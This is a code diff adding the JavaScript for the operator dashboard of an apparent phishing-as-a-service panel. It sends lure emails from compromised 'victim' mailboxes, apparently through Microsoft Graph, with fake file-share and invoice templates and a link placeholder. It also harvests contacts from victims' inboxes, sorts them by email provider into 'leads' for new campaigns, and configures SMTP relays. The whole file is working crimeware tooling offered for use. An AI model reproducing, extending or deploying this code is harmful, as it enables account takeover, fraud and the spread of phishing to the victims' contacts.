+            document.getElementById('b2b_subject').value = 'Template: ' + select.options[select.selectedIndex].text;
+            document.getElementById('b2b_body').value = 'Please fill in the email body.';
+            document.getElementById('summary_template').textContent = select.options[select.selectedIndex].text;
+            updateB2BPreview();
+        }
+    }
+
+    // ===== PROFESSIONAL EMAIL PREVIEW =====
+    function updateB2BPreview() {
+        const subject = document.getElementById('b2b_subject').value || 'No subject';
+        const body = document.getElementById('b2b_body').value || '';
+        const link = document.getElementById('b2b_link').value || 'https://your-link.com';
+        const senderName = document.getElementById('b2b_sender_name').value || 'John Smith';
+        const recipients = document.getElementById('b2b_recipients').value.split('\n').filter(l => l.trim());
+        const firstRecipient = recipients.length > 0 ? recipients[0] : 'user@example.com';
+        const firstName = firstRecipient.split('@')[0] || 'User';
+        const domain = firstRecipient.split('@')[1] || 'company.com';
+        const company = domain.split('.')[0] || 'Company';
+        const date = new Date().toLocaleDateString('en-US', { weekday: 'short', month: 'short', day: 'numeric', year: 'numeric' });
+        const fromEmail = senderName.toLowerCase().replace(/\s/g, '.') + '@' + domain;
+
+        const replaceVars = (text) => {
+            return text
+                .replace(/\{\{sender_name\}\}/g, senderName)
+                .replace(/\{\{sender_email\}\}/g, fromEmail)
+                .replace(/\{\{sender_domain\}\}/g, domain)
+                .replace(/\{\{first_name\}\}/g, firstName)
+                .replace(/\{\{company\}\}/g, company)
+                .replace(/\{\{date\}\}/g, date)
+                .replace(/\{\{link\}\}/g, link)
+                .replace(/\{\{email\}\}/g, firstRecipient)
+                .replace(/\{\{file\}\}/g, 'Quarterly_Report_Q2.pptx')
+                .replace(/\{\{file_name\}\}/g, 'Q4_Financial_Report.pdf')
+                .replace(/\{\{file_size\}\}/g, '3.2 MB')
+                .replace(/\{\{doc_name\}\}/g, 'Policy_Update.docx')
+                .replace(/\{\{task_name\}\}/g, 'Review onboarding deck')
+                .replace(/\{\{poll_topic\}\}/g, 'Team lunch preference')
+                .replace(/\{\{event_name\}\}/g, 'Project Sync')
+                .replace(/\{\{form_name\}\}/g, 'Feedback Form')
+                .replace(/\{\{order_id\}\}/g, '12345');
+        };
+
+        let renderedSubject = replaceVars(subject);
+        let renderedBody = replaceVars(body);
+
+        document.getElementById('summary_from').textContent = document.getElementById('b2b_from').options[document.getElementById('b2b_from').selectedIndex]?.text || '-';
+        document.getElementById('summary_recipients').textContent = recipients.length;
+        document.getElementById('summary_delay').textContent = document.getElementById('b2b_delay').value + 's';
+        document.getElementById('summary_link').textContent = link || '-';
+        const templateSelect = document.getElementById('b2b_template');
+        if (templateSelect.value !== 'custom') {
+            document.getElementById('summary_template').textContent = templateSelect.options[templateSelect.selectedIndex].text;
+        }
+
+        const container = document.getElementById('emailPreviewContainer');
+        if (!renderedBody.trim()) {
+            container.innerHTML = `<div class="email-preview-empty"><i class="bi bi-envelope"></i><span>Enter email content to see a live preview</span></div>`;
+            return;
+        }
+
+        const avatarLetter = senderName.charAt(0).toUpperCase() || 'U';
+
+        container.innerHTML = `
+            <div class="email-preview-wrapper">
+                <div class="preview-action-bar">
+                    <span class="action-btn"><i class="bi bi-reply"></i> Reply</span>
+                    <span class="action-btn"><i class="bi bi-reply-all"></i> Reply all</span>
+                    <span class="action-btn"><i class="bi bi-arrow-right-square"></i> Forward</span>
+                    <span class="sep">|</span>
+                    <span class="action-btn"><i class="bi bi-trash"></i> Delete</span>
+                    <span class="action-btn"><i class="bi bi-three-dots"></i> More</span>
+                </div>
+                <div class="email-preview-header">
+                    <div class="preview-avatar">${avatarLetter}</div>
+                    <div class="preview-sender-info">
+                        <div class="sender-name">${senderName}</div>
+                        <div class="sender-email">${fromEmail}</div>
+                    </div>
+                    <div class="preview-header-right">
+                        <div class="date">${date}</div>
+                        <span class="more-icon"><i class="bi bi-caret-down-fill"></i></span>
+                    </div>
+                </div>
+                <div class="email-preview-meta">
+                    <div class="meta-row"><span class="meta-label">To</span><span class="meta-value">${firstRecipient}</span></div>
+                    <div class="meta-row"><span class="meta-label">Cc</span><span class="meta-value" style="color:#5b6b7c;">—</span></div>
+                    <div class="subject-line">${renderedSubject}</div>
+                </div>
+                <div class="email-preview-body">
+                    <div class="preview-content">
+                        ${renderedBody}
+                        <div class="footer-note">${fromEmail} · ${date}</div>
+                    </div>
+                </div>
+                <div class="email-preview-footer">
+                    <div class="footer-left">
+                        <span class="attachment-badge"><i class="bi bi-paperclip"></i> 1 attachment</span>
+                        <span class="sep">|</span>
+                        <span>📩 ${recipients.length} recipient${recipients.length !== 1 ? 's' : ''}</span>
+                    </div>
+                    <div class="footer-right">
+                        <span class="badge-preview">${document.getElementById('b2b_importance').value || 'Normal'}</span>
+                        <span><i class="bi bi-lock" style="font-size:0.6rem;"></i> TLS</span>
+                        <span><i class="bi bi-check-circle" style="color:#28a745;"></i></span>
+                    </div>
+                </div>
+            </div>
+        `;
+    }
+
+    // ===== B2B FORM SUBMIT =====
+    document.getElementById('b2bComposeForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const victimId = document.getElementById('b2b_from').value;
+        const recipients = document.getElementById('b2b_recipients').value;
+        let subject = document.getElementById('b2b_subject').value;
+        let body = document.getElementById('b2b_body').value;
+        const link = document.getElementById('b2b_link').value;
+        const senderName = document.getElementById('b2b_sender_name').value;
+        const method = document.querySelector('input[name="b2b_method"]:checked')?.value || 'graph';
+
+        const recipientList = recipients.split('\n').filter(l => l.trim());
+        if (recipientList.length > 0) {
+            const firstRecipient = recipientList[0];
+            const firstName = firstRecipient.split('@')[0] || 'User';
+            const domain = firstRecipient.split('@')[1] || 'company.com';
+            const company = domain.split('.')[0] || 'Company';
+            const date = new Date().toLocaleDateString();
+            const replaceVars = (text) => text
+                .replace(/\{\{sender_name\}\}/g, senderName)
+                .replace(/\{\{sender_email\}\}/g, senderName.toLowerCase().replace(/\s/g, '.') + '@' + domain)
+                .replace(/\{\{sender_domain\}\}/g, domain)
+                .replace(/\{\{first_name\}\}/g, firstName)
+                .replace(/\{\{company\}\}/g, company)
+                .replace(/\{\{date\}\}/g, date)
+                .replace(/\{\{link\}\}/g, link)
+                .replace(/\{\{email\}\}/g, firstRecipient)
+                .replace(/\{\{file\}\}/g, 'Quarterly_Report_Q2.pptx')
+                .replace(/\{\{file_name\}\}/g, 'Q4_Financial_Report.pdf')
+                .replace(/\{\{file_size\}\}/g, '3.2 MB')
+                .replace(/\{\{doc_name\}\}/g, 'Policy_Update.docx')
+                .replace(/\{\{task_name\}\}/g, 'Review onboarding deck')
+                .replace(/\{\{poll_topic\}\}/g, 'Team lunch preference')
+                .replace(/\{\{event_name\}\}/g, 'Project Sync')
+                .replace(/\{\{form_name\}\}/g, 'Feedback Form')
+                .replace(/\{\{order_id\}\}/g, '12345');
+            subject = replaceVars(subject);
+            body = replaceVars(body);
+        }
+
+        if (!recipients.trim()) { alert('Enter at least one recipient.'); return; }
+        document.getElementById('b2b_result').innerHTML = '<div class="alert alert-info">⏳ Sending...</div>';
+
+        fetch('/operator/b2b_send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                victim_id: victimId,
+                subject: subject,
+                body: body,
+                recipients: recipients,
+                template_id: document.getElementById('b2b_template').value,
+                method: method
+            })
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.sent !== undefined) {
+                document.getElementById('b2b_result').innerHTML = `<div class="alert alert-success">✅ Sent ${data.sent} of ${data.total} emails. Failed: ${data.failed?.length || 0}</div>`;
+            } else {
+                document.getElementById('b2b_result').innerHTML = `<div class="alert alert-danger">❌ ${data.error}</div>`;
+            }
+        })
+        .catch(err => {
+            document.getElementById('b2b_result').innerHTML = `<div class="alert alert-danger">❌ ${err.message}</div>`;
+        });
+    });
+
+    // ===== LIVE PREVIEW ON INPUT =====
+    document.addEventListener('DOMContentLoaded', function() {
+        const fields = ['b2b_subject', 'b2b_body', 'b2b_link', 'b2b_sender_name', 'b2b_recipients', 'b2b_delay', 'b2b_importance'];
+        fields.forEach(id => {
+            const el = document.getElementById(id);
+            if (el) {
+                el.addEventListener('input', updateB2BPreview);
+                el.addEventListener('change', updateB2BPreview);
+            }
+        });
+        document.getElementById('b2b_from')?.addEventListener('change', updateB2BPreview);
+        updateB2BPreview();
+        const savedMode = localStorage.getItem('ai_mode');
+        if (savedMode) {
+            selectAIMode(savedMode);
+        } else {
+            selectAIMode('ai');
+        }
+        loadSmtpSettings();
+    });
+
+    // ===== AI MODE SELECT =====
+    function selectAIMode(mode) {
+        const modes = ['keyword', 'ai', 'both'];
+        modes.forEach(m => {
+            const el = document.getElementById('ai-mode-' + m);
+            if (el) {
+                el.className = (m === mode) ? 'card bg-dark border-success alert-mode-card' : 'card bg-dark border-secondary alert-mode-card';
+            }
+        });
+        localStorage.setItem('ai_mode', mode);
+        fetch('/operator/ai/mode', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ mode: mode })
+        }).catch(() => {});
+    }
+
+    document.getElementById('aiRiskThreshold')?.addEventListener('input', function() {
+        document.getElementById('aiThresholdValue').textContent = this.value + '%';
+    });
+
+    // ===== EXTEND SUBSCRIPTION =====
+    function extendSubscription() {
+        if (confirm('Do you want to extend your subscription? This will notify the admin.')) {
+            fetch('/operator/extend_subscription', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' }
+            })
+            .then(r => r.json())
+            .then(data => {
+                alert(data.message);
+                location.reload();
+            })
+            .catch(err => alert('Error: ' + err.message));
+        }
+    }
+
+    // ===== EMAIL EXTRACTOR =====
+    let extractedData = {};
+    function startExtraction() {
+        const victimId = document.getElementById('extractor_victim').value;
+        if (!victimId) { alert('Select a victim.'); return; }
+        document.getElementById('extraction_results').innerHTML = '<div class="alert alert-info">⏳ Extracting...</div>';
+        fetch('/operator/victim/' + victimId + '/harvest')
+        .then(r => r.json())
+        .then(data => {
+            if (data.status === 'done') {
+                document.getElementById('extraction_results').innerHTML = `
+                    <div class="card">
+                        <div class="card-header">📋 Discovered Contacts</div>
+                        <div class="card-body">
+                            <div id="providerGroups" class="row mb-3"></div>
+                            <div id="selectedProvider" style="display:none;">
+                                <h6 class="text-success" id="selectedProviderName"></h6>
+                                <div id="emailList" class="mt-2"></div>
+                                <div class="mt-2">
+                                    <button class="btn btn-sm btn-outline-primary" onclick="copySelectedProvider()">📋 Copy</button>
+                                    <button class="btn btn-sm btn-outline-success" onclick="exportSelectedProvider()">📥 Export</button>
+                                </div>
+                            </div>
+                            <div id="noSelectionMessage" class="alert alert-secondary">Click a provider above to view emails.</div>
+                            <div class="mt-2"><div class="alert alert-success">✅ Extracted ${data.harvested || 0} emails. Click "Classify" to sort by provider.</div></div>
+                        </div>
+                    </div>
+                `;
+            } else {
+                document.getElementById('extraction_results').innerHTML = `<div class="alert alert-danger">❌ ${data.error || 'Unknown error'}</div>`;
+            }
+        })
+        .catch(err => {
+            document.getElementById('extraction_results').innerHTML = `<div class="alert alert-danger">❌ ${err.message}</div>`;
+        });
+    }
+    function classifyExtracted() {
+        const victimId = document.getElementById('extractor_victim').value;
+        if (!victimId) { alert('Select a victim.'); return; }
+        document.getElementById('extraction_results').innerHTML = '<div class="alert alert-info">⏳ Classifying...</div>';
+        fetch('/operator/classify/' + victimId)
+        .then(r => r.json())
+        .then(data => {
+            extractedData = data;
+            renderProviderGroups(data);
+        })
+        .catch(err => {
+            document.getElementById('extraction_results').innerHTML = `<div class="alert alert-danger">❌ ${err.message}</div>`;
+        });
+    }
+    function renderProviderGroups(groups) {
+        let html = '';
+        const providerColors = { 'gmail': '#ea4335', 'office365': '#0078d4', 'godaddy': '#1b8d2e', 'outlook': '#0072c6', 'yahoo': '#7b0099', 'other': '#6c757d' };
+        let total = 0;
+        for (const [provider, emails] of Object.entries(groups)) {
+            total += emails.length;
+            const color = providerColors[provider.toLowerCase()] || '#6c757d';
+            html += `<div class="col-md-2"><div class="provider-group-card" onclick="selectProvider('${provider}')" id="group-${provider}"><div class="count" style="color:${color};">${emails.length}</div><div class="label">${provider}</div></div></div>`;
+        }
+        document.getElementById('extraction_results').innerHTML = `
+            <div class="card">
+                <div class="card-header">📋 Discovered Contacts</div>
+                <div class="card-body">
+                    <div id="providerGroups" class="row mb-3">${html}</div>
+                    <div id="selectedProvider" style="display:none;">
+                        <h6 class="text-success" id="selectedProviderName"></h6>
+                        <div id="emailList" class="mt-2"></div>
+                        <div class="mt-2">
+                            <button class="btn btn-sm btn-outline-primary" onclick="copySelectedProvider()">📋 Copy</button>
+                            <button class="btn btn-sm btn-outline-success" onclick="exportSelectedProvider()">📥 Export</button>
+                        </div>
+                    </div>
+                    <div id="noSelectionMessage" class="alert alert-secondary">Click a provider above to view emails.</div>
+                    <div class="mt-2"><small class="text-muted">Total: ${total} emails across ${Object.keys(groups).length} providers</small></div>
+                </div>
+            </div>
+        `;
+        document.getElementById('selectedProvider').style.display = 'none';
+        document.getElementById('noSelectionMessage').style.display = 'block';
+        document.querySelectorAll('.provider-group-card').forEach(el => el.classList.remove('selected'));
+    }
+    function selectProvider(provider) {
+        document.querySelectorAll('.provider-group-card').forEach(el => el.classList.remove('selected'));
+        const el = document.getElementById('group-' + provider);
+        if (el) el.classList.add('selected');
+        const emails = extractedData[provider] || [];
+        document.getElementById('selectedProviderName').textContent = provider + ' (' + emails.length + ' emails)';
+        const list = document.getElementById('emailList');
+        if (emails.length === 0) {
+            list.innerHTML = '<div class="alert alert-secondary">No emails for this provider.</div>';
+        } else {
+            let html = '<div class="email-list">';
+            emails.forEach(e => { html += `<div class="email-list-item">${e}</div>`; });
+            html += '</div>';
+            list.innerHTML = html;
+        }
+        document.getElementById('selectedProvider').style.display = 'block';
+        document.getElementById('noSelectionMessage').style.display = 'none';
+        window.selectedProvider = provider;
+    }
+    function copySelectedProvider() {
+        const provider = window.selectedProvider;
+        if (!provider) { alert('Select a provider first.'); return; }
+        const emails = extractedData[provider] || [];
+        if (emails.length === 0) { alert('No emails to copy.'); return; }
+        const text = emails.join('\n');
+        navigator.clipboard.writeText(text).then(() => {
+            alert('📋 Copied ' + emails.length + ' emails from ' + provider);
+        }).catch(() => {
+            const textarea = document.createElement('textarea');
+            textarea.value = text;
+            document.body.appendChild(textarea);
+            textarea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textarea);
+            alert('📋 Copied ' + emails.length + ' emails from ' + provider);
+        });
+    }
+    function exportSelectedProvider() {
+        const provider = window.selectedProvider;
+        if (!provider) { alert('Select a provider first.'); return; }
+        const emails = extractedData[provider] || [];
+        if (emails.length === 0) { alert('No emails to export.'); return; }
+        const blob = new Blob([emails.join('\n')], { type: 'text/plain' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = provider + '_emails.txt';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+    }
+
+    // =============================================================
+    // ==== IMPROVED PROCESS CAMPAIGN (with modal) =================
+    // =============================================================
+    function processCampaign(campaignId) {
+        const modal = new bootstrap.Modal(document.getElementById('processResultModal'));
+        const body = document.getElementById('processResultBody');
+        body.innerHTML = '<div class="alert alert-info">⏳ Processing campaign, please wait...</div>';
+        modal.show();
+
+        fetch('/operator/campaign/' + campaignId + '/process')
+            .then(r => r.json())
+            .then(data => {
+                if (data.error) {
+                    body.innerHTML = `<div class="alert alert-danger">❌ ${data.error}</div>`;
+                    return;
+                }
+
+                const totalHarvested = data.total_harvested || 0;
+                const uniqueSenders = data.unique_senders || 0;
+                const verifiedLeads = data.verified_leads || 0;
+                const providerGroups = data.provider_groups || {};
+
+                // Build provider breakdown
+                let providerHtml = '';
+                const providerColors = { 'gmail':'#ea4335','office365':'#0078d4','godaddy':'#1b8d2e','outlook':'#0072c6','yahoo':'#7b0099','protonmail':'#6d4aff','zoho':'#e4252c','icloud':'#999','other':'#6c757d' };
+                let hasProviders = false;
+                for (const [provider, emails] of Object.entries(providerGroups)) {
+                    if (emails.length > 0) {
+                        hasProviders = true;
+                        const color = providerColors[provider.toLowerCase()] || '#6c757d';
+                        providerHtml += `<span class="provider-badge ${provider.toLowerCase()}" style="background:${color};">${provider}: ${emails.length}</span>`;
+                    }
+                }
+
+                if (!hasProviders && totalHarvested === 0) {
+                    // No harvested emails
+                    body.innerHTML = `
+                        <div class="alert alert-warning">
+                            <h6><i class="bi bi-info-circle"></i> No harvested emails found in this campaign.</h6>
+                            <p>Please harvest emails from victims first (use the Harvest button on victims in Dashboard or use Email Extractor).</p>
+                        </div>
+                        <div class="mt-2 text-muted">Tip: Process extracts unique senders from harvested emails and creates B2B leads.</div>
+                    `;
+                } else {
+                    body.innerHTML = `
+                        <div class="row stat-grid" style="grid-template-columns: repeat(3,1fr);">
+                            <div class="stat-card"><div class="stat-number">${totalHarvested}</div><div class="stat-label">Harvested Emails</div></div>
+                            <div class="stat-card"><div class="stat-number">${uniqueSenders}</div><div class="stat-label">Unique Senders</div></div>
+                            <div class="stat-card"><div class="stat-number">${verifiedLeads}</div><div class="stat-label">Leads Created</div></div>
+                        </div>
+                        ${hasProviders ? `<div class="mt-2"><h6>Provider Breakdown</h6><div>${providerHtml}</div></div>` : ''}
+                        <div class="mt-2 text-muted">✅ Process completed. Leads are now available for B2B campaigns.</div>
+                    `;
+                }
+            })
+            .catch(err => {
+                body.innerHTML = `<div class="alert alert-danger">❌ ${err.message}</div>`;
+            });
+    }
+
+    // =============================================================
+    // ==== IMPROVED GET LEADS (with modal) ========================
+    // =============================================================
+    function getLeads(campaignId) {
+        const modal = new bootstrap.Modal(document.getElementById('leadsResultModal'));
+        const body = document.getElementById('leadsResultBody');
+        body.innerHTML = '<div class="alert alert-info">⏳ Fetching leads...</div>';
+        modal.show();
+
+        fetch('/operator/campaign/' + campaignId + '/leads')
+            .then(r => r.json())
+            .then(data => {
+                if (data.error) {
+                    body.innerHTML = `<div class="alert alert-danger">❌ ${data.error}</div>`;
+                    return;
+                }
+                if (!Array.isArray(data) || data.length === 0) {
+                    body.innerHTML = `
+                        <div class="alert alert-warning">
+                            <h6><i class="bi bi-info-circle"></i> No leads found for this campaign.</h6>
+                            <p>Run <strong>Process</strong> first to extract leads from harvested emails.</p>
+                        </div>
+                        <div class="mt-2 text-muted">Leads are created from unique email senders found in victims' harvested inboxes.</div>
+                    `;
+                    return;
+                }
+
+                let tableRows = '';
+                data.forEach(lead => {
+                    const providerColor = {
+                        'gmail':'#ea4335','office365':'#0078d4','godaddy':'#1b8d2e',
+                        'outlook':'#0072c6','yahoo':'#7b0099','protonmail':'#6d4aff',
+                        'zoho':'#e4252c','icloud':'#999','other':'#6c757d'
+                    }[lead.provider?.toLowerCase()] || '#6c757d';
+                    tableRows += `
+                        <tr>
+                            <td>${lead.email}</td>
+                            <td><span class="badge" style="background:${providerColor};">${lead.provider || 'Unknown'}</span></td>
+                            <td>${lead.score || 0}</td>
+                            <td>${lead.verified ? '<span class="badge bg-success">Verified</span>' : '<span class="badge bg-secondary">Unverified</span>'}</td>
+                            <td>${lead.contacted ? '<span class="badge bg-warning">Contacted</span>' : '<span class="badge bg-light text-dark">New</span>'}</td>
+                        </tr>
+                    `;
+                });
+
+                body.innerHTML = `
+                    <div class="table-responsive">
+                        <table class="table table-sm table-hover">
+                            <thead><tr><th>Email</th><th>Provider</th><th>Score</th><th>Status</th><th>Contacted</th></tr></thead>
+                            <tbody>${tableRows}</tbody>
+                        </table>
+                    </div>
+                    <div class="mt-2 text-muted">Total leads: ${data.length}</div>
+                `;
+            })
+            .catch(err => {
+                body.innerHTML = `<div class="alert alert-danger">❌ ${err.message}</div>`;
+            });
+    }
+
+    // =============================================================
+    // ==== SMTP SETTINGS FUNCTIONS ================================
+    // =============================================================
+    async function loadSmtpSettings() {
+        try {
+            const resp = await fetch('/operator/smtp/status');
+            const data = await resp.json();
+            document.getElementById('smtp_enabled').checked = data.enabled || false;
+            document.getElementById('smtp_server').value = data.server || '';
+            document.getElementById('smtp_port').value = data.port || 587;
+            document.getElementById('smtp_username').value = data.username || '';
+            document.getElementById('smtp_from_email').value = data.from_email || '';
+            document.getElementById('smtp_from_name').value = data.from_name || '';
+            document.getElementById('smtp_use_tls').checked = data.use_tls !== false;
+        } catch (e) { /* ignore */ }
+    }
+
+    document.getElementById('smtpSettingsForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const payload = {
+            enabled: document.getElementById('smtp_enabled').checked,
+            server: document.getElementById('smtp_server').value.trim(),
+            port: parseInt(document.getElementById('smtp_port').value) || 587,
+            username: document.getElementById('smtp_username').value.trim(),
+            password: document.getElementById('smtp_password').value.trim(),
+            from_email: document.getElementById('smtp_from_email').value.trim(),
+            from_name: document.getElementById('smtp_from_name').value.trim(),
+            use_tls: document.getElementById('smtp_use_tls').checked
+        };
+        const resp = await fetch('/operator/smtp/settings', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        const result = await resp.json();
+        if (result.status === 'success') {
+            alert('✅ SMTP settings saved successfully!');
+        } else {
+            alert('❌ Error: ' + (result.message || 'Unknown error'));
+        }
+    });
+
+    async function testSmtpConnection() {
+        const resultDiv = document.getElementById('smtpTestResult');
+        resultDiv.innerHTML = '<div class="alert alert-info">⏳ Testing SMTP connection...</div>';
+        try {
+            const resp = await fetch('/operator/smtp/test', { method: 'POST' });
+            const data = await resp.json();
+            if (resp.ok && data.status === 'success') {
+                resultDiv.innerHTML = `<div class="alert alert-success">✅ ${data.message}</div>`;
+            } else {
+                resultDiv.innerHTML = `<div class="alert alert-danger">❌ ${data.message || 'Test failed'}</div>`;
+            }
+        } catch (e) {
+            resultDiv.innerHTML = `<div class="alert alert-danger">❌ ${e.message}</div>`;
+        }
+    }
+
+    // =============================================================
+    // ==== PASSWORD CHANGE ========================================
+    // =============================================================
+    document.getElementById('changePasswordForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const current = document.getElementById('cp_current').value;
+        const newp = document.getElementById('cp_new').value;
+        const confirm = document.getElementById('cp_confirm').value;
+        const result = document.getElementById('cp_result');
+
+        result.innerHTML = '<div class="alert alert-info">⏳ Changing password...</div>';
+
+        try {
+            const resp = await fetch('/operator/change_password', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ current_password: current, new_password: newp, confirm_password: confirm })
+            });
+            const data = await resp.json();
+            if (resp.ok && data.status === 'success') {
+                result.innerHTML = `<div class="alert alert-success">✅ ${data.message}</div>`;
+                document.getElementById('changePasswordForm').reset();
+            } else {
+                result.innerHTML = `<div class="alert alert-danger">❌ ${data.message}</div>`;
+            }
+        } catch (err) {
+            result.innerHTML = `<div class="alert alert-danger">❌ ${err.message}</div>`;
+        }
+    });
+
+    // =============================================================
+    // ==== REPORT ISSUE ===========================================
+    // =============================================================
+    function openReportModal() {
+        const modal = new bootstrap.Modal(document.getElementById('reportModal'));
+        modal.show();
+        document.getElementById('reportForm').reset();
+        document.getElementById('reportResult').innerHTML = '';
+    }
+
+    document.getElementById('reportForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const subject = document.getElementById('reportSubject').value.trim();
+        const message = document.getElementById('reportMessage').value.trim();
+        const resultDiv = document.getElementById('reportResult');
+
+        if (!subject || !message) {
+            resultDiv.innerHTML = '<div class="alert alert-warning">Please fill in all fields.</div>';
+            return;
+        }
+
+        resultDiv.innerHTML = '<div class="alert alert-info">⏳ Sending report...</div>';
+
+        try {
+            const resp = await fetch('/operator/report', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ subject, message })
+            });
+            const data = await resp.json();
+            if (resp.ok && data.status === 'success') {
+                resultDiv.innerHTML = `<div class="alert alert-success">✅ ${data.message}</div>`;
+                setTimeout(() => {
+                    bootstrap.Modal.getInstance(document.getElementById('reportModal')).hide();
+                }, 2000);
+            } else {
+                resultDiv.innerHTML = `<div class="alert alert-danger">❌ ${data.message || 'Failed to send report'}</div>`;
+            }
+        } catch (err) {
+            resultDiv.innerHTML = `<div class="alert alert-danger">❌ ${err.message}</div>`;
+        }
+    });
+
+</script>
+
+</body>
+</html>
